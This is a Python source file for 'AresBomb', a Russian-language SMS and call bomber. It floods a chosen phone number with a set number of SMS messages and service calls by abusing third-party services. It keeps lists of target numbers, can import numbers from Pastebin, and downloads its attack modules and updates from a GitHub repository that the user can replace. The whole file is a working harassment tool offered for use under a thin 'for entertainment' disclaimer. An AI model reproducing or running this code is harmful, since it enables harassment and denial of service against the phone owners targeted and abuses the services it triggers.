import requests, time
import random, os, codecs
from sys import exit

version = 2.01
set = [1, 0]
fav_phones = []
repo = "MaksPV/AresBomb-databases"

if os.path.isfile("sms.py") and os.path.isfile("calls.py"):
    from sms import Sms
    from calls import Calls
    
    Smss = Sms()
    Callss = Calls()
else:
    with codecs.open("sms.py", "w", encoding = 'utf8') as f:
        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/заглушка/sms.py").text)
    f.close()
    with codecs.open("calls.py", "w", encoding = 'utf8') as f:
        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/заглушка/calls.py").text)
    f.close()
    print("Запустите еще раз")
    exit()

if os.path.isfile("config.txt") != 1:
    with open('config.txt', 'w') as filehandle:  
        for listitem in set:
            filehandle.write('%s\n' % listitem)

if os.path.isfile("config.txt") == 1:
    set = []
    with open('config.txt', 'r') as filehandle:
         for line in filehandle:
             currentPlace = line[:-1]
             set.append(float(currentPlace))

if os.path.isfile("phones.data") != 1:
    with open('phones.data', 'w') as filehandle:  
        for listitem in fav_phones:
            filehandle.write('%s\n' % listitem)

if os.path.isfile("phones.data") == 1:
    with open('phones.data', 'r') as filehandle:
         for line in filehandle:
             currentPlace = line[:-1]
             fav_phones.append(currentPlace)

if os.path.isfile("repo.data") != 1:
    with open('repo.data', 'w') as filehandle:  
        filehandle.write("MaksPV/AresBomb-databases")

if os.path.isfile("repo.data") == 1:
    with open('repo.data', 'r') as filehandle:
         repo = filehandle.read()

def return_phones():
    global fav_phones, _phone
    print(banner)
    for i in range(int(len(fav_phones)/2)):
        print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
    _phone = fav_phones[int(input("\n"))*2]
    
def save_phones():
    global fav_phones
    while True:
        print(banner)
        for i in range(int(len(fav_phones)/2)):
            print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
        print("\n1 - Добавить номер\n2 - Удалить номер\n3 - Скачать базу с Pastebin\n0 - Выйти")
        _menu = input()
        if _menu == "0": break
        elif _menu == "1":
            fav_phones.append(input("Введите номер: "))
            fav_phones.append(input("Введите метку для номера: "))
        elif _menu == "2":
            delete_phones = int(input("Введите номер номера, который вы хотите удалить: "))
            fav_phones.pop(delete_phones*2)
            fav_phones.pop(delete_phones*2)
        elif _menu == "3":
            print(banner)
            pastebin_id = input("Введите id записи на pastebin: ")
            try:
                pastebin_data = requests.get('https://pastebin.com/raw/' + pastebin_id).text
                a_menu = input("Вы хотите заменить или добавить текущий список?\n\n0 - Заменить\n1 - добавить\n\n")
                if a_menu == "0":
                    fav_phones = pastebin_data.splitlines()
                    print(fav_phones)
                elif a_menu == "1":
                    fav_phones.extend(pastebin_data.splitlines())
                print("Готово")
            except:
                print("Ошибка, такой пасты не существует")
        with open('phones.data', 'w') as filehandle:
            for listitem in fav_phones:
                filehandle.write('%s\n' % listitem)

def update():
    global version
    print("Проверка обновлений")
    try:
        upd=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/last_version.txt')
        upd_vers = float(upd.text[0:6])
        if upd_vers > version:
            print("Найдено обновление\n" + upd.text[0:6] + "\nИзменения:\n" + upd.text[7:])
            print("\nНачато обновление")
            upd_boom=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/boom.py')
            f = open("boom.py", "wb")
            f.write(upd_boom.content)
            f.close()
            print("\nОбновление завершено, откройте бомбер заново командой\npython AresBomb/boom.py")
            return "exit"
        elif upd_vers == version: print("Установлена последняя версия, вы прекрасны")
        elif upd_vers < version: print("Не хочешь попасть в команду?")
        else: print("Ошибка, файл обновлений не найден")
    except BaseException:
        print("Нет интернета, попробуйте позже")

def bomb():
    global set, _phone
    _count_finish = 0
    print(banner)
    _phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
    if _phone == "1": return_phones()
    try:
        _count = int(input('Количество сообщений: (100 по умолчанию)'))
    except:
        _count = 100
        
    try:
        _timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
    except:
        _timer = 0
        
    if _phone[0] == '+': _phone = _phone[1:]
    if _phone[0] == '8': _phone = '7'+_phone[1:]
    if _phone[0] == '9': _phone = '7'+_phone
        

    def screen():
        print(banner)
        print("Для остановки немедленной нажмите Ctrl+Z\n")
        print('Номер: '+ _phone+ '\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
    
    while _count_finish != _count:
        randsh = random.randint(1,100)
        if set[1] > randsh:
            _service_call = random.randint(0, Callss.all)
            try:
                Callss.send(_service_call, _phone)
                screen()
                print("Сервис звонок " + str(_service_call) + " отправлен")
                _count_finish += 1
            except:
                screen()
                print("!!! Сервис звонок " + str(_service_call) + " не отправлен")
        else:
            _service_sms = random.randint(0, Sms.all)
            print(str(_service_sms) + " отправляется")
            try:
                Smss.send(_service_sms, _phone)
                screen()
                print("Сервис смс " + str(_service_sms) + " отправлен")
                _count_finish += 1
            except Exception as ex:
                print(ex)
                screen()
                print("!!! Сервис смс " + str(_service_sms) + " не отправлен")
        time.sleep(_timer)
    print(banner+'\nРезультат:\n\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
    if set[0] == 1.0: exit()
    else: input("Бомбинг завершён, нажмите ENTER для выхода в главное меню")

def settings():
    global set
    while True:
        print(banner)
        print("\n1 - Выходить из программы поле бомбинга: " + str(set[0]))
        print("2 - Вероятность бомбинга звонками: " + str(set[1])+"%")
        print("\n0 - Выход из этого меню и сохранение")
        menu = input()
        if menu == "0":
            with open('config.txt', 'w') as filehandle:  
                for listitem in set:
                    filehandle.write('%s\n' % listitem)
            break
        elif menu == "1":
            if set[0] == 1: set[0] = 0
            elif set[0] == 0: set[0] = 1
        elif menu == "2":
            print(banner)
            set[1] = float(input("\nВведите шанс звонка: "))

def get_base():
    global repo
    while True:
        print(banner)
        # print("У вас сейчас\n\nБаза СМС:\n{0}\n\nБаза звонков:\n{1}\n".format(Smss.author, Calls.author))
        menu = input("1 - Загрузить список доступных баз\n2 - Поменять репозиторий\n\n0 - Выйти\n")
        if menu == "0": break
        elif menu == "1":
            print(banner)
            
            a = requests.get("https://raw.githubusercontent.com/" + repo + "/master/all.txt").text.splitlines()
            b = [[], []]
            
            for i in a:
                b[0].append(i[:-3])
                b[1].append(i[-2:])
            
            print("Список доступных баз:\n\n0 - Выйти\n")
            for i in range(len(b[0])):
                print(str(i + 1) + " - " + b[0][i])
            
            menu = input()
            try:
                menu = int(menu) - 1
            except:
                pass
            if menu == -1: pass
            else:
                print(banner)
                print("Информация:")
                print(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/description.txt").text)
                if b[1][menu] == "10":
                    print("1 - Скачать базу СМС")
                elif b[1][menu] == "11":
                    print("1 - Скачать базу СМС\n2 - Скачать базу звонков\n3 - Скачать всё")
                elif b[1][menu] == "01":
                    print("2 - Скачать базу звонков")
                else:
                    pass
                print("\n0 - Выйти")
                menu1 = input()
                if menu1 == "0":
                    pass
                elif menu1 == "1":
                    with codecs.open("sms.py", "w", encoding = 'utf8') as f:
                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/sms.py").text)
                    f.close()
                    exit()
                elif menu1 == "2":
                    with codecs.open("calls.py", "w", encoding = 'utf8') as f:
                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/calls.py").text)
                    f.close()
                    exit()
                elif menu1 == "3":
                    with codecs.open("sms.py", "w", encoding = 'utf8') as f:
                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/sms.py").text)
                    f.close()
                    with codecs.open("calls.py", "w", encoding = 'utf8') as f:
                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/calls.py").text)
                    f.close()
                    exit()
                
        elif menu == "2":
            print(banner)
            print("Текущий репозиторий: " + repo)
            print("\n0 - Выйти")
            print("Введите ссылку на гитхабе, типа MaksPV/AresBomb-databases")
            
            c = input("\n")
            if c == "0":
                pass
            else:    
                repo = c
            with open('repo.data', 'w') as filehandle:  
                filehandle.write(repo)
            pass

def info():
    global banner, version
    print(banner+"\nВерсия "+str(version)+"\n\nБомбер создан только для развлекательных целей. За все действия что вы с ним проводите отвечаете только вы\n\nСоздатель данной модификации t.me/maksimushka\n\nНажмите ENTER чтобы выйти")
    input()

if update() == "exit": exit()
time.sleep(1)

while True:
    banner = ("\n" * 100)+ """                   _______   
                  /\______\  
                  \/______/                                                       
    ____________     ___   
   / ___________\   / __'\ 
  /\ \________L\ \ /\ \L\ \\
  \ \____________/ \ \____/
   \/___________/   \/___/

 telegram channel: @AresBomb

{}
""".format(Smss.author)
    print(banner)
    menu = input("1 - Начать бомбинг\n2 - Настройки бомбера\n3 - Номера в избранном\n4 - Скачать другие базы\n5 - Информация о бомбере\n\n0 - Выход\n")
    if menu == "0": exit()
    elif menu == "1": bomb()
    elif menu == "2": settings()
    elif menu == "3": save_phones()
    elif menu == "4": get_base()
    elif menu == "5": info()
